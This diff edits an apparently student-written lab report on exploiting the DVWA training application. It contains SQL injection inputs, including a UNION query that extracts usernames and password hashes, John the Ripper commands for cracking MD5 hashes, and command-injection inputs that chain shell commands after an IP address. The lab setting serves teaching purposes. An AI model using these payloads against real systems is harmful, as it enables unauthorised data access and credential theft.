@@ -39,23 +39,28 @@ Demonstrate exploitation techniques (SQL Injection and Command Injection) on a c
 1. DVWA → **SQL Injection** lab.  
 2. Input: 1' OR '1'='1
 3. Result: Multiple rows returned confirming SQL injection.
+   1. Screenshot: 'screenshots/SQL_Injection.png'
 
-### B. Extract credentials via UNION
+   ### B. Extract credentials via UNION
 1. SQLi lab input: ' UNION SELECT user, password FROM users#
 2. Result: Returned rows containing `user` and `password` (hashes or plaintext). Saved the hash to `hashes.txt`.
+   1. Screenshot: 'screenshots/sql.png'
 
 ### C. Crack MD5 hashes
-# save the hash 
+1. save the hash
+   '''bash
 echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
 
 # crack with John (MD5)
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
 sudo john --show --format=raw-md5 hashes.txt
+Result: cracked passwords saved
+   1. Screenshot: 'screenshots/password.png
 
 ### D. Command Injection Payloads
-127.0.0.1 && uname -a       # show OS info
-127.0.0.1 && id             # show effective user
-127.0.0.1 && ls -la /var/www/html   # list webroot directory
+1. 127.0.0.1 && uname -a- show OS info
+2. 127.0.0.1 && id - show effective user
+3. 127.0.0.1 && ls -la /var/www/html - list webroot directory
 
 ## 5. Severity
 1. SQL Injection: High (direct access to sensitive data and authentication bypass).
